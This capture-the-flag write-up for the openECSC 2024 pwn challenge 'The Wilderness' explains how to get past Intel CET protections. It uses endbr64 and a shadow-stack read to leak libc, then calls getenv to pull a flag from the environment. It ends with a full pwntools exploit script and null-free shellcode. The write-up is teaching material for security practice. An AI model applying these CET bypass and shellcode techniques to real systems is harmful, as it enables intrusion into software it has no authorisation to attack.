# openECSC 2024 - Round 2

## [pwn] The Wilderness (25 solves)
Hey I heard you are a wild one!

`nc thewilderness.challs.open.ecsc2024.it 38012`

Authors: Giulia Martino <@Giulia>, Oliver Lyak <@ly4k>

## Overview

This challenge is a x86_64 pwn challenge, which uses [Intel SDE](https://www.intel.com/content/www/us/en/developer/articles/tool/software-development-emulator.html), an emulator that allows code with new instruction sets to run on systems that don’t support these instructions. Within the context of this challenge, the relevant addition is Control-flow Enforcement Technology (CET), and this challenge aims to be a smooth introduction to its two main features: shadow stack and indirect branch tracking. The user is asked to provide a shellcode, and the challenge copies it into a newly mmapped memory area, then runs it. Before executing the provided shellcode, the challenge zeroes out all the registers; in addition, null bytes and syscall-like instructions are forbidden. The user has to find the flag, which is stored in an environment variable. The binary has all protections enabled.

### Setup

The provided attachment includes the entire set of files used for remote deployment and needed to run the challenge locally. The challenge can be started up by just running the command `docker compose up --build`.  

The first useful step consists in understanding how to debug the challenge. While developing it, vanilla `gdb` was used, with a super simple custom gdb script that prints the current state of the program execution (registers, disassembly of the next few instructions, stack):

```
set disassembly-flavor intel

define context
    echo ----------------- registers -----------------\n
    info registers
    echo ------------------- code --------------------\n
    x/6i $pc
    echo ------------------- stack -------------------\n
    x/16gx $rsp
end

define xx
    si
    context
end
```

Considering this is a shellcoding challenge, most of the fancy extensions commands usually loved while doing pwn (e.g. heap commands) are not really relevant, and these two custom commands were totally enough to debug it properly.

By reading SDE's documentation or by just running `./sde-external-9.33.0-2024-01-07-lin/sde64 --help | grep debug`, it is possible to find the command line option `-debug`, which makes SDE wait for gdb to attach and start debugging. From the gdb prompt, you can connect to the remote gdb stub by running `target remote :<port>` with the port indicated by the SDE output.

## Solution

### Challenge analysis

The challenge binary is not stripped and very simple, so reversing it doesn't take long. First, it disables buffering and greets the user with a welcome message; then it calls `mmap` to get a page-long fresh memory area, at a fixed address `0xdead000`, which will be used to store our shellcode. It then asks the user to input the desired shellcode in raw binary format and checks that no null bytes and no syscall-like instructions are present inside the shellcode. The forbidden instructions are:

```
- syscall  | 0x0F 0x05
- sysenter | 0x0F 0x34
- int 0x80 | 0xCD 0x80
```

Then it calls `mprotect` on the shellcode page to set it only readable and executable.

The following function takes care of zeroing out all the registers, including the special ones `fs` and `gs` which need specific syscalls. In the end, it just jumps to our shellcode.

## Exploit strategy

Considering we cannot execute raw syscalls, all the registers are zeroed out and our code is in the middle of nowhere, the first goal to focus on is finding a leak.

The challenge is running inside SDE, which enables us to run code containing new instructions no matter if the underlying CPU supports them. There is ways to use those instructions to get a leak.

For example, it is possible to use AVX instructions to perform a timing side-channel attack and find mapped addresses by scanning the address space. Instructions as `vmaskmov` can be used as an oracle to understand if an address is mapped or not, by measuring its execution times. This is a relatively new and very cool technique, but it won't be explained here: the challenge aims to serve as a basic introduction to Intel CET, so the writeup will focus on its features. We didn't really want to prevent players from using this technique anyway, so no specific restrictions were implemented to block it. More information about this technique can be found [here](https://arxiv.org/pdf/2304.07940).

By looking at how the challenge is started, we immediately note the presence of the flag `-cet`. CET stands for Control-flow Enforcement Technology, a set of processors features that provide protection against control flow hijacking attacks. From the Linux Kernel docs:

> CET introduces shadow stack and indirect branch tracking (IBT). A shadow stack is a secondary stack allocated from memory which cannot be directly modified by applications. When executing a CALL instruction, the processor pushes the return address to both the normal stack and the shadow stack. Upon function return, the processor pops the shadow stack copy and compares it to the normal stack copy. If the two differ, the processor raises a control-protection fault. [...]

We can so far ignore IBT, and focus on the shadow stack. We don't want to try to bypass this protection to overwrite some return address now, we don't even know where the real stack is located. Let's just focus on what the shadow stack is: it contains all the return addresses that have been pushed onto the real stack since the beginning of the execution, which means it contains both pie and libc leaks. What if we can somehow read from it?

Turns out CET also introduces a new instruction, `rdsspq (Read Shadow Stack Pointer)`, which lets us copy the address of the shadow stack to an arbitrary register. After we got the shadow stack address, we can read inside it and leak a libc address, that we can afterwards use to execute some libc functions and read the flag. So we can just start our shellcode with:

```assembly
    rdsspq <register>;
    nop;
```

and check what we get inside the chosen register. If we try to send this tiny shellcode to the challenge, we will quickly find out that it is actually segfaulting at the `nop` instruction. What's happening here? Let's get back to the second fundamental CET feature: indirect branch tracking (IBT). From the same docs:

> IBT verifies indirect CALL/JMP targets are intended as marked by the compiler with 'ENDBR' opcodes.

The challenge is executing our shellcode with a `jmp rax` instruction, which is an indirect branch. This means CET will consider it as not allowed if the target code is not marked with an `endbr64` instruction. If we modify the shellcode and insert it, we will see it doesn't segfault anymore and correctly executes the `nop` instruction:

```assembly
    endbr64;
    rdsspq <register>;
    nop;
```

Now that we have the shadow stack pointer, we can read inside it and get a libc leak by reading a return address (to `__libc_start_main`) from it. We can compute the offset from our leak to libc base while debugging, and then compute libc base at runtime with a `sub` instruction inside the shellcode. The following code performs these operations and ends having libc base saved in `r12`; `r12` is chosen because it is a `non-volatile register`, which means it is preserved across function calls.

```python
    leak_offs =  0x29d90
    shellcode = asm(f"""
        endbr64;                                /* ibt */
        rdsspq r12;                             /* r12 = shadow stack addr */
        add r12, 8;
        mov r12, qword ptr [r12];               /* r12 = libc leak */

        /* get libc base */
        mov ebx, {hex(neg32(leak_offs))};
        neg ebx;                                /* rbx = leak offs */
        sub r12, rbx;                           /* r12 = libc base */
    """)
```

It is worth noting that the variable `leak_offs` is inserted inside the shellcode in its negated form, and then negated again at runtime. This is just a workaround for the challenge null byte ban: we are not allowed to insert null bytes inside the shellcode, so we will need to use alternatives for all the instructions and immediates that contain them. This is just a possible solution, but there is definitely a lot more ways to do that.

These two basic helper functions have been implemented in Python for these use cases:

```python
def neg32(val):
    return -val & 0xffffffff

def neg64(val):
    return -val & 0xffffffffffffffff
```

Now that libc base is available, we just need to read the flag from the environment variables and then print it to stdout. Let's remember that IBT is enabled, so we cannot jump in the middle of functions (for example to execute a `one_gadget`).

One of the most convenient ways to get an environment variable using libc is calling the function `getenv` with the environment variable's name as the first (and only) parameter. So, we need `rdi` pointing to the `FLAG\x00` string. As it is often done, we could push the string to the stack and then move the stack address into `rdi`, with something like the following shellcode (note again the use of the negated string value because of the null byte ban):

```python
    flag_env = u64(b"FLAG\x00".ljust(8, b"\x00"))
    shellcode = asm(f"""
            [...]

            mov rdi, {hex(neg64(flag_env))};
            neg rdi;                                /* rdi = FLAG\x00 */
            push rdi;
            mov rdi, rsp;                           /* rdi = addr of FLAG */

        """)
```

If we try to execute this shellcode though, we will get a segfault again, this time at `push rdi`. That's because the stack pointer has been zeroed out the same way as all the other registers, so we don't currently have a stack to push stuff to. Additionally, even if we found a way to avoid using the stack for this step, we would still need to call `getenv`, which performs some stack operations like `push`s and `pop`s, which would anyway segfault. We need to restore the stack.

Considering we have libc base saved in `r12`, an easy way to do that is computing the address of the `environ` libc variable, which is pointing to the stack, and put that into `rsp`:

```python
    libc = ELF("libs/libc.so.6")
    environ_offs = libc.sym["environ"] + 1
    shellcode = asm(f"""
            [...]

            /* restore the stack */
            mov edx, {hex(neg32(environ_offs))};
            neg edx;
            dec rdx;                                /* rdx = environ offs */
            add rdx, r12;                           /* rdx = environ */
            mov rsp, qword ptr [rdx];               /* restore the stack */

        """)
```

Now that the stack is back, the `push` operation won't segfault anymore and we can call `getenv("FLAG\x00")` which will return an address pointing to the flag string.

```python
    libc = ELF("libs/libc.so.6")
    getenv_offs = libc.sym["getenv"]
    flag_env = u64(b"FLAG\x00".ljust(8, b"\x00"))
    shellcode = asm(f"""
            [...]

            /* getenv("FLAG\x00") */
            mov ecx, {hex(neg32(getenv_offs))};
            neg ecx;                                /* rcx = getenv offs */
            add rcx, r12;                           /* rcx = getenv */

            mov rdi, {hex(neg64(flag_env))};
            neg rdi;                                /* rdi = FLAG\x00 */
            push rdi;
            mov rdi, rsp;                           /* rdi = addr of FLAG */

            mov r15, rcx;                           /* r15 = getenv */
            call r15;                               /* call getenv */

        """)
```

Now that `rax` contains the address of the flag, we just need to print it to stdout. We could immediately think of calling something like `puts`, `printf` or `write`, but if you try to use them, you will end up segfaulting again. This time the `fs` register is the guilty one. For example, if we look at the `puts` disassembly using gdb:

```
    (gdb) disass puts
    Dump of assembler code for function __GI__IO_puts:
    Address range 0x80e50 to 0x80fe9:
    0x0000000000080e50 <+0>:     endbr64
    0x0000000000080e54 <+4>:     push   r14
    0x0000000000080e56 <+6>:     push   r13
    0x0000000000080e58 <+8>:     push   r12
    0x0000000000080e5a <+10>:    mov    r12,rdi
    0x0000000000080e5d <+13>:    push   rbp
    0x0000000000080e5e <+14>:    push   rbx
    0x0000000000080e5f <+15>:    sub    rsp,0x10
    0x0000000000080e63 <+19>:    call   0x28490 <*ABS*+0xa86a0@plt>
    0x0000000000080e68 <+24>:    mov    r13,QWORD PTR [rip+0x198fc9]        # 0x219e38
    0x0000000000080e6f <+31>:    mov    rbx,rax
    0x0000000000080e72 <+34>:    mov    rbp,QWORD PTR [r13+0x0]
    0x0000000000080e76 <+38>:    mov    eax,DWORD PTR [rbp+0x0]
    0x0000000000080e79 <+41>:    and    eax,0x8000
    0x0000000000080e7e <+46>:    jne    0x80ed8 <__GI__IO_puts+136>
    0x0000000000080e80 <+48>:    mov    r14,QWORD PTR fs:0x10               <--------------------- here
```

we can notice that it's executing an instruction that takes a qword from the address at `fs+0x10`. Our `fs` has been zeroed out too, so this results in a segfault. The workaround here is finding a libc function which doesn't use it; the `syscall` function is a perfect candidate, because it only sets registers properly and then executes the syscall instruction. We still have libc base in `r12`, so this can be the final step of our shellcode:

```python
    libc = ELF("libs/libc.so.6")
    syscall_offs = libc.sym["syscall"]
    shellcode = asm(f"""
            [...]

            /* syscall(1, 1, addr of flag, 0x101) */
            xor rdi, rdi;                           /* rdi = 0 */
            add rdi, 1;                             /* rdi = 1 */
            xor rsi, rsi;                           /* rsi = 0 */
            add rsi, 1;                             /* rsi = 1 */
            mov rdx, rax;                           /* rdx = addr of flag */
            mov rcx, {hex(neg64(0x101))}
            neg rcx;                                /* r10 = 0x101 */

            mov r15, {hex(neg64(syscall_offs))};
            neg r15;
            add r15, r12;                           /* r15 = syscall */
            call r15;

        """)
```

## Exploit

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

HOST = os.environ.get("HOST", "localhost")
PORT = int(os.environ.get("PORT", 38012))
GDB_PORT = int(os.environ.get("GDB_PORT", 1234))

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
filename = os.path.join(os.path.dirname(__file__), "build/the_wilderness")
exe = context.binary = ELF(args.EXE or filename, checksec=False)

def start():
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process(["./sde-external-9.33.0-2024-01-07-lin/sde64"] +  (["-debug"] if args.ATTACH else []) + ["-no-follow-child", "-avx512", "-cet", "-cet_output_file", "/dev/null", "--", exe.path])
    return io

gdbscript = '''
source .gdbinit
b *0xdead000
c
'''
gdbscript = "\t-ex\t".join(gdbscript.splitlines()).split("\t")[1:]

io = start()

if args.ATTACH:
    # Here we need to parse the debug port from the output of the process
    io.recvuntil(b"target remote")
    GDB_PORT = io.recvline().strip().decode().split(":")[1]
    print(f"[*] attaching to {GDB_PORT}")
    run_in_new_terminal(["gdb", filename, "-ex", f"target remote {HOST}:{GDB_PORT}"] + gdbscript)

def neg32(val):
    return -val & 0xffffffff

def neg64(val):
    return -val & 0xffffffffffffffff

libc = ELF(os.path.join(os.path.dirname(__file__), "libs/libc.so.6"), checksec=False)
leak_offs =  0x29d90
getenv_offs = libc.sym["getenv"]
syscall_offs = libc.sym["syscall"]
environ_offs = libc.sym["environ"] + 1
flag_env = u64(b"FLAG\x00".ljust(8, b"\x00"))

# get FLAG env var and print it to stdout
shellcode = asm(f"""
    endbr64;                                /* ibt */
    rdsspq r12;                             /* r12 = shadow stack addr */
    add r12, 8;
    mov r12, qword ptr [r12];               /* r12 = libc leak */

    /* get libc base */
    mov ebx, {hex(neg32(leak_offs))};
    neg ebx;                                /* rbx = leak offs */
    sub r12, rbx;                           /* r12 = libc base */

    /* restore the stack */
    mov edx, {hex(neg32(environ_offs))};
    neg edx;
    dec rdx;                                /* rdx = environ offs */
    add rdx, r12;                           /* rdx = environ */
    mov rsp, qword ptr [rdx];               /* restore the stack */

    /* getenv("FLAG\x00") */
    mov ecx, {hex(neg32(getenv_offs))};
    neg ecx;                                /* rcx = getenv offs */
    add rcx, r12;                           /* rcx = getenv */

    mov rdi, {hex(neg64(flag_env))};
    neg rdi;                                /* rdi = FLAG\x00 */
    push rdi;
    mov rdi, rsp;                           /* rdi = addr of FLAG */

    mov r15, rcx;                           /* r15 = getenv */
    call r15;                               /* call getenv */

    /* syscall(1, 1, addr of flag, 0x101) */
    xor rdi, rdi;                           /* rdi = 0 */
    add rdi, 1;                             /* rdi = 1 */
    xor rsi, rsi;                           /* rsi = 0 */
    add rsi, 1;                             /* rsi = 1 */
    mov rdx, rax;                           /* rdx = addr of flag */
    mov rcx, {hex(neg64(0x101))}
    neg rcx;                                /* r10 = 0x101 */

    mov r15, {hex(neg64(syscall_offs))};
    neg r15;
    add r15, r12;                           /* r15 = syscall */
    call r15;
""")

if b"\x00" in shellcode:
    print(f"[-] shellcode contains null bytes")
    exit(1)

io.sendlineafter(b"How many bytes do you want to write in The Wilderness?\n", str(len(shellcode)).encode())
io.sendlineafter(b"What do you want to do in The Wilderness?\n", shellcode)

if args.ATTACH:
    io.interactive()
else:
    res = io.recvuntil(b"openECSC{")
    print('openECSC{' + io.recvuntil(b'}').decode())
```
